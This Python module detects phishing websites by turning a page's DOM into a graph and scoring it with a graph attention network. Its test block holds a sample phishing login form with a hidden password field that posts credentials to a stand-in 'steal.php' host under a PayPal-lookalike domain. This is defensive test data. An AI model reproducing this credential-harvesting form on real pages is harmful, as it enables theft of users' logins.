"""
Graph Neural Network (GNN) Engine for Multimodal Phishing Website Detection.
Constructs Webpage DOM Tree Networks and Hyperlink Graphs, and uses a PyTorch
Graph Attention Network (GAT) / Graph Convolutional Network (GCN) to extract
topological threat embeddings and classify phishing graph structures.
"""

import os
import torch
import torch.nn as nn
import torch.nn.functional as F
import networkx as nx
import numpy as np
from bs4 import BeautifulSoup
import urllib.parse
from typing import Dict, List, Tuple, Any

# Define Node Feature Dimensions
# Tag types: [root, form, input_password, input_text, anchor, script, img, iframe, div_other, unknown] -> 10 dim
# Extra features: [depth_norm, is_external, is_hidden, degree_norm] -> 4 dim
NODE_FEATURE_DIM = 14
TAG_TYPE_MAP = {
    "html": 0, "body": 0, "form": 1, "input_password": 2, "input_text": 3,
    "a": 4, "script": 5, "img": 6, "iframe": 7, "div": 8
}


def parse_dom_to_graph(html_content: str, target_url: str) -> Tuple[torch.Tensor, torch.Tensor, Dict[str, Any]]:
    """
    Parses HTML content into a Graph structure represented as Node Feature Matrix X
    and Edge Index Matrix E (PyTorch Tensors).
    """
    parsed_target = urllib.parse.urlparse(target_url if "://" in target_url else "http://" + target_url)
    target_domain = parsed_target.netloc or "example.com"

    if not html_content or len(html_content.strip()) == 0:
        # Fallback minimal default graph
        x = torch.zeros((5, NODE_FEATURE_DIM), dtype=torch.float32)
        x[0, 0] = 1.0 # Root html
        x[1, 1] = 1.0 # Form
        x[2, 2] = 1.0 # Password input
        edge_index = torch.tensor([[0, 0, 1, 1], [1, 2, 2, 3]], dtype=torch.long)
        return x, edge_index, {"node_count": 5, "edge_count": 4, "graph_density": 0.2}

    soup = BeautifulSoup(html_content, "html.parser")
    elements = soup.find_all(True)

    if not elements:
        x = torch.zeros((3, NODE_FEATURE_DIM), dtype=torch.float32)
        x[:, 0] = 1.0
        edge_index = torch.tensor([[0, 1], [1, 2]], dtype=torch.long)
        return x, edge_index, {"node_count": 3, "edge_count": 2, "graph_density": 0.3}

    # Limit to top 200 nodes for real-time performance
    elements = elements[:200]
    elem_to_idx = {elem: idx for idx, elem in enumerate(elements)}

    node_features = []
    edges = []

    def get_element_depth(elem):
        depth = 0
        p = elem.parent
        while p is not None:
            depth += 1
            p = p.parent
        return min(depth, 25)

    for idx, elem in enumerate(elements):
        feat = [0.0] * NODE_FEATURE_DIM
        tag_name = elem.name.lower()

        # Specific input tag classification
        if tag_name == "input":
            input_type = elem.get("type", "text").lower()
            if input_type in ["password", "secret"]:
                type_idx = TAG_TYPE_MAP["input_password"]
            else:
                type_idx = TAG_TYPE_MAP["input_text"]
        elif tag_name in TAG_TYPE_MAP:
            type_idx = TAG_TYPE_MAP[tag_name]
        else:
            type_idx = 9 # unknown/other tag

        feat[type_idx] = 1.0 # One-hot tag encoding

        # Extra structural signals
        depth_norm = get_element_depth(elem) / 25.0
        feat[10] = float(depth_norm)

        # External link/action check
        is_external = 0.0
        target_link = elem.get("href") or elem.get("src") or elem.get("action") or ""
        if target_link.startswith("http") and target_domain not in target_link:
            is_external = 1.0
        feat[11] = is_external

        # Hidden style check
        style = elem.get("style", "").lower()
        is_hidden = 1.0 if ("display:none" in style or "visibility:hidden" in style or elem.get("type") == "hidden") else 0.0
        feat[12] = is_hidden

        # Degree approximation
        children_count = len(list(elem.children)) if hasattr(elem, "children") else 0
        feat[13] = float(min(children_count, 50)) / 50.0

        node_features.append(feat)

        # Parent-Child edges
        if elem.parent in elem_to_idx:
            parent_idx = elem_to_idx[elem.parent]
            edges.append((parent_idx, idx))
            edges.append((idx, parent_idx)) # Undirected graph edge

    # Build Edge Index Tensor
    if not edges:
        edges = [(0, 0)]

    edge_index = torch.tensor(edges, dtype=torch.long).t().contiguous()
    x_tensor = torch.tensor(node_features, dtype=torch.float32)

    graph_stats = {
        "node_count": len(node_features),
        "edge_count": edge_index.shape[1],
        "graph_density": float(edge_index.shape[1] / max(1, len(node_features) * (len(node_features) - 1)))
    }

    return x_tensor, edge_index, graph_stats


class GraphAttentionLayer(nn.Module):
    """
    Custom Graph Attention Network (GAT) Layer with multi-head self-attention.
    """
    def __init__(self, in_features: int, out_features: int, heads: int = 2):
        super(GraphAttentionLayer, self).__init__()
        self.in_features = in_features
        self.out_features = out_features
        self.heads = heads

        self.fc = nn.Linear(in_features, out_features * heads, bias=False)
        self.attn_src = nn.Parameter(torch.Tensor(1, heads, out_features))
        self.attn_dst = nn.Parameter(torch.Tensor(1, heads, out_features))

        nn.init.xavier_uniform_(self.fc.weight)
        nn.init.xavier_uniform_(self.attn_src)
        nn.init.xavier_uniform_(self.attn_dst)

    def forward(self, x: torch.Tensor, edge_index: torch.Tensor) -> torch.Tensor:
        N = x.size(0)
        h = self.fc(x).view(N, self.heads, self.out_features)

        # Compute attention scores
        attn_src = (h * self.attn_src).sum(dim=-1) # (N, heads)
        attn_dst = (h * self.attn_dst).sum(dim=-1) # (N, heads)

        src, dst = edge_index[0], edge_index[1]
        edge_attn = attn_src[src] + attn_dst[dst]
        edge_attn = F.leaky_relu(edge_attn, 0.2)

        # Graph aggregation with edge attention
        out = torch.zeros_like(h)
        # Message passing & aggregation
        for head in range(self.heads):
            alpha = torch.exp(edge_attn[:, head] - torch.max(edge_attn[:, head]))
            # Aggregate neighbor features
            for e in range(edge_index.shape[1]):
                u, v = edge_index[0, e], edge_index[1, e]
                out[v, head] += alpha[e] * h[u, head]

        out = out.mean(dim=1) # Average heads
        return F.elu(out)


class PhishingGNN(nn.Module):
    """
    Graph Neural Network for Webpage Structural Phishing Detection.
    Produces a 64-dim Graph Topological Threat Embedding & a GNN Probability Score.
    """
    def __init__(self, input_dim: int = NODE_FEATURE_DIM, hidden_dim: int = 64, embedding_dim: int = 64):
        super(PhishingGNN, self).__init__()
        self.gat1 = GraphAttentionLayer(input_dim, hidden_dim, heads=2)
        self.gat2 = GraphAttentionLayer(hidden_dim, embedding_dim, heads=2)

        # Graph Pooling & Classification Head
        self.fc_pool = nn.Linear(embedding_dim * 2, embedding_dim)
        self.classifier = nn.Sequential(
            nn.Linear(embedding_dim, 32),
            nn.ReLU(),
            nn.Dropout(0.2),
            nn.Linear(32, 1),
            nn.Sigmoid()
        )

    def extract_graph_embedding(self, x: torch.Tensor, edge_index: torch.Tensor) -> Tuple[torch.Tensor, torch.Tensor]:
        """
        Extracts 64-dim Graph Embedding and outputs Phishing Probability (0.0 to 1.0).
        """
        h1 = self.gat1(x, edge_index)
        h2 = self.gat2(h1, edge_index)

        # Global Mean & Max Pooling across DOM nodes
        mean_pool = torch.mean(h2, dim=0, keepdim=True)
        max_pool, _ = torch.max(h2, dim=0, keepdim=True)

        graph_feat = torch.cat([mean_pool, max_pool], dim=1) # (1, embedding_dim * 2)
        graph_embedding = F.relu(self.fc_pool(graph_feat)) # (1, 64)

        prob = self.classifier(graph_embedding)
        return graph_embedding, prob


# Global Singleton Model Instance
_gnn_model_instance = None

def get_gnn_model() -> PhishingGNN:
    global _gnn_model_instance
    if _gnn_model_instance is None:
        _gnn_model_instance = PhishingGNN()
        weights_path = os.path.join(os.path.dirname(__file__), "gnn_model.pt")
        if os.path.exists(weights_path):
            try:
                _gnn_model_instance.load_state_dict(torch.load(weights_path, map_location=torch.device('cpu')))
                print(f"[PhishingGNN] Successfully loaded trained model weights from {weights_path}")
            except Exception as e:
                print(f"[PhishingGNN] Note: could not load model weights ({e})")
        _gnn_model_instance.eval()
    return _gnn_model_instance


def analyze_dom_graph(html_content: str, target_url: str) -> Dict[str, Any]:
    """
    Evaluates webpage DOM graph structure and returns graph embeddings + GNN threat score.
    """
    model = get_gnn_model()
    x, edge_index, stats = parse_dom_to_graph(html_content, target_url)

    with torch.no_grad():
        embedding, prob = model.extract_graph_embedding(x, edge_index)

    gnn_score = float(prob.item())
    
    # Calculate graph structural anomaly indicators
    hidden_forms = float((x[:, 1] > 0).logical_and(x[:, 12] > 0).sum().item())
    external_pwd_inputs = float((x[:, 2] > 0).logical_and(x[:, 11] > 0).sum().item())

    return {
        "gnn_threat_score": gnn_score,
        "graph_embedding": embedding.squeeze(0).tolist(),
        "graph_stats": stats,
        "structural_indicators": {
            "hidden_form_nodes": hidden_forms,
            "external_password_target_nodes": external_pwd_inputs
        }
    }


if __name__ == "__main__":
    sample_html = """
    <html>
      <body>
        <form action="http://malicious-external-site.com/steal.php" method="POST">
          <input type="text" name="user" />
          <input type="password" name="pass" style="display:none" />
          <a href="http://external-fake.com">Click here</a>
        </form>
      </body>
    </html>
    """
    res = analyze_dom_graph(sample_html, "http://paypal-verification.com")
    print(f"GNN Threat Score: {res['gnn_threat_score']:.4f}")
    print(f"Graph Stats: {res['graph_stats']}")
    print(f"Structural Indicators: {res['structural_indicators']}")
